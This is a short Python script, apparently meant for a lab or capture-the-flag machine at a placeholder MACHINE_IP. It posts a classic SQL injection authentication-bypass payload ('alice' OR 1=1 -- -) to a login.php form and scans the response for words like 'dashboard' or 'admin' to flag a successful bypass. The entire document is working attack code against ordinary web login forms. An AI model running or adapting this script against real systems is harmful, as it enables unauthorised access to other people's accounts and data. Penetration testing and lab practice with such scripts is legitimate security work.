import requests
from requests.exceptions import (
    ConnectionError,
    ConnectTimeout,
    ReadTimeout,
    RequestException
)

# =========================
# CONFIGURATION
# =========================
URL = "http://MACHINE_IP:5000/login.php"   # <-- change this
TIMEOUT = 5

payloads = [
    {
        "username": "alice' OR 1=1 -- -",
        "password": "test",
        "description": "Classic SQLi auth bypass"
    }
]

# =========================
# SESSION SETUP
# =========================
session = requests.Session()
session.headers.update({
    "User-Agent": "Security-Test-Agent/1.0",
    "Accept": "text/html,application/xhtml+xml,application/xml",
    "Content-Type": "application/x-www-form-urlencoded"
})

# =========================
# TEST LOOP
# =========================
def test_payload(payload):
    print("\n[+] Testing:", payload["description"])

    try:
        response = session.post(
            URL,
            data={
                "username": payload["username"],
                "password": payload["password"]
            },
            timeout=TIMEOUT,
            allow_redirects=True
        )

        print("[+] Status Code:", response.status_code)
        print("[+] Response Length:", len(response.text))

        # Very basic login success indicators
        success_keywords = [
            "welcome",
            "dashboard",
            "logout",
            "admin",
            "profile"
        ]

        if any(keyword.lower() in response.text.lower() for keyword in success_keywords):
            print("[!!!] POSSIBLE AUTHENTICATION BYPASS DETECTED")
        else:
            print("[-] No obvious bypass detected")

    except ConnectTimeout:
        print("[!] Connection timed out (port closed or filtered)")
    except ReadTimeout:
        print("[!] Server did not respond in time")
    except ConnectionError:
        print("[!] Cannot connect to target (service down / wrong IP)")
    except RequestException as e:
        print("[!] HTTP error:", e)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        exit()

# =========================
# MAIN
# =========================
if __name__ == "__main__":
    print("[*] Target:", URL)
    for p in payloads:
        test_payload(p)
